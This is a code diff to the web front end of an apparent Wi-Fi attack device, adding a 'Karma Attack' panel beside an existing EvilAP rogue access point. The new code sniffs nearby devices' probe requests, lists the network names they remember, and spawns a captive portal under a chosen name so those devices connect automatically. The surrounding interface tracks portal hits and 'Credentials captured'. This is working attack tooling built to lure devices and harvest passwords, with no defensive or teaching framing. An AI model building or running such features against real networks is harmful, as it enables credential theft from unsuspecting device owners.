@@ -748,7 +748,7 @@ async function wifiscanView(){
    <span class="muted" style="margin-left:10px;font-size:12px" id="scanInfo"></span>
    <table id="scanTable" style="margin-top:12px"></table></div>
   <div class="panel"><h2>${icon("wifi")} Live Packet Analyzer</h2>
-   <p class="muted">Channel-hopping live feed: frames by type + APs seen with signal. Management AP goes down while analyzing.</p>
+   <p class="muted">Channel-hopping live feed: frames by type + APs seen with signal. Management AP stays up (ROC visits). Auto-stops after 2 minutes.</p>
    <button class="primary" id="anBtn" onclick="toggleAnalyzer()">Start Analyzer</button>
    <div id="liveStats" style="display:none;margin-top:12px">
      <div style="display:flex;gap:20px;flex-wrap:wrap;margin-bottom:10px">
@@ -771,7 +771,7 @@ async function toggleAnalyzer(){
     clearInterval(anTimer); anTimer=null;
     $("#liveStats").style.display="none";
   } else {
-    if(!(await confirmModal("Start live analyzer? Management AP goes down while running.")))return;
+    if(!(await confirmModal("Start live packet analyzer?")))return;
     await api("/api/analyzer/start",{method:"POST"});
     btn.dataset.on="1"; btn.textContent="Stop Analyzer";
     $("#liveStats").style.display="block";
@@ -796,7 +796,7 @@ async function wifiscanView(){
    <span class="muted" style="margin-left:10px;font-size:12px" id="scanInfo"></span>
    <table id="scanTable" style="margin-top:12px"></table></div>
   <div class="panel"><h2>${icon("wifi")} Live Packet Analyzer</h2>
-   <p class="muted">Channel-hopping live feed: frames by type + APs seen with signal. Management AP goes down while analyzing.</p>
+   <p class="muted">Channel-hopping live feed: frames by type + APs seen with signal. Management AP stays up (ROC visits). Auto-stops after 2 minutes.</p>
    <button class="primary" id="anBtn" onclick="toggleAnalyzer()">Start Analyzer</button>
    <div id="liveStats" style="display:none;margin-top:12px">
      <div style="display:flex;gap:20px;flex-wrap:wrap;margin-bottom:10px">
@@ -842,6 +842,13 @@ function evilapView(){
      <button class="danger" id="evilStartBtn" onclick="evilStart()">Start EvilAP</button>
      <button class="small" id="evilStopBtn" style="display:none" onclick="api('/api/evilap/stop',{method:'POST'})">Stop</button>
    </div></div>
+  <div class="panel"><h2>Karma Attack (probe lure)</h2>
+   <p class="muted">Sniffs for devices asking "is my network here?" (probe requests), lists the names they want, and spawns the portal under one of them. Devices that remember the name connect automatically. Management AP stays up during probing.</p>
+   <div style="display:flex;gap:8px;margin-bottom:10px">
+     <button class="primary" id="karmaBtn" onclick="karmaToggle()">Start Probe Sniffing</button>
+     <span class="muted" id="karmaInfo" style="font-size:12px;align-self:center"></span>
+   </div>
+   <table id="karmaTable"></table></div>
   <div class="panel"><h2>Capture Statistics</h2><table>
    <tr><td>Portal hits</td><td id="eHits">-</td></tr>
    <tr><td>Credentials captured</td><td id="eCaps">-</td></tr></table>
@@ -858,7 +865,39 @@ function evilapView(){
      <button class="small primary" onclick="saveEvilHtml()">Save page</button>
      <button class="small danger" onclick="clearEvilHtml()">Remove custom page</button>
    </div></div>`;
-  refreshEvil(); evilTimer=setInterval(refreshEvil,3000);
+  refreshEvil(); refreshKarma(); evilTimer=setInterval(()=>{ refreshEvil(); refreshKarma(); },2000);
+}
+async function karmaToggle(){
+  if(karmaOn){
+    await api("/api/karma/stop",{method:"POST"}).catch(()=>{});
+    karmaOn=false; toast("Karma probing stopped"); refreshKarma();
+  } else {
+    await jpost("/api/karma/start",{});
+    karmaOn=true; toast("Karma probing - watching for probe requests"); refreshKarma();
+  }
+}
+async function refreshKarma(){
+  const btn=$("#karmaBtn"); if(!btn)return;
+  try{
+    const probes=await api("/api/karma/probes");
+    // infer state: probes API returns list; track button label locally too
+    btn.textContent = karmaOn ? "Stop Probe Sniffing" : "Start Probe Sniffing";
+    $("#karmaInfo").textContent = karmaOn ? `${probes.length} SSID(s) probed` : "";
+    $("#karmaTable").innerHTML = probes.length
+      ? "<tr><th>Probed SSID</th><th>Requests</th><th></th></tr>" +
+        probes.sort((x,y)=>y.count-x.count).map(p=>
+          `<tr><td>${esc(p.ssid)}</td><td>${p.count}</td>
+           <td><button class="small danger" onclick="karmaSpawn('${esc(p.ssid)}')">Spawn portal</button></td></tr>`).join("")
+      : (karmaOn ? `<tr><td colspan="3" class="muted">listening for probe requests...</td></tr>` : "");
+  }catch(e){}
+}
+let karmaOn=false;
+async function karmaSpawn(ssid){
+  if(!(await confirmModal("Spawn portal as '"+ssid+"'? Devices probing for it will connect.")))return;
+  await jpost("/api/karma/spawn",{ssid});
+  karmaOn=false;
+  toast("Karma portal running as "+ssid,"err");
+  refreshEvil(); refreshKarma();
 }
 async function refreshEvil(){
   try{ const s=await api("/api/evilap/status");
